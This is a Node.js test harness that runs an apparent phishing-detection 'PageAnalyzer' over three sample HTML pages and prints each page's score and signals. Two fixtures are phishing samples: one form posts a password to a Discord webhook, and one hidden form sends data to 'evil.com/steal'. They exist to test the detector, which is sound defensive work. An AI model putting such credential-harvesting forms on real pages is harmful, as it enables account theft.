const fs = require('fs');
const { JSDOM } = require('jsdom');

// Load the PageAnalyzer code
const analyzerCode = fs.readFileSync('content/page-analyzer.js', 'utf-8');

function test(html, name) {
  const dom = new JSDOM(html, { url: "https://example.com" });
  const { window } = dom;
  const { document } = window;
  
  // Expose to the code
  global.window = window;
  global.document = document;
  global.location = window.location;

  // Execute the analyzer script in this context
  eval(analyzerCode);
  
  const analyzer = new window.PageAnalyzer();
  const results = analyzer.analyze();
  
  console.log(`\n--- Test: ${name} ---`);
  console.log(`Score: ${results.score.toFixed(2)}`);
  console.log(`Critical Threat: ${results.criticalThreat}`);
  console.log('Signals:');
  results.signals.forEach(s => console.log(`  - [${s.severity.toUpperCase()}] ${s.name}`));
}

// 1. Safe Page
test(`
  <html>
    <body>
      <h1>Welcome</h1>
      <p>Just a normal page.</p>
    </body>
  </html>
`, "Safe Page");

// 2. Phishing Page with Webhook Exfil
test(`
  <html>
    <body>
      <h1>Verify your account</h1>
      <form action="https://discord.com/api/webhooks/123/abc" method="POST">
        <input type="password" name="password">
      </form>
      <script>
         // Nothing here
      </script>
    </body>
  </html>
`, "Discord Webhook Exfil");

// 3. Hidden Form Stealer
test(`
  <html>
    <body>
      <input type="password" id="floating-pass" />
      <form style="display:none;" action="https://evil.com/steal">
      </form>
    </body>
  </html>
`, "Hidden Form & Floating Password");
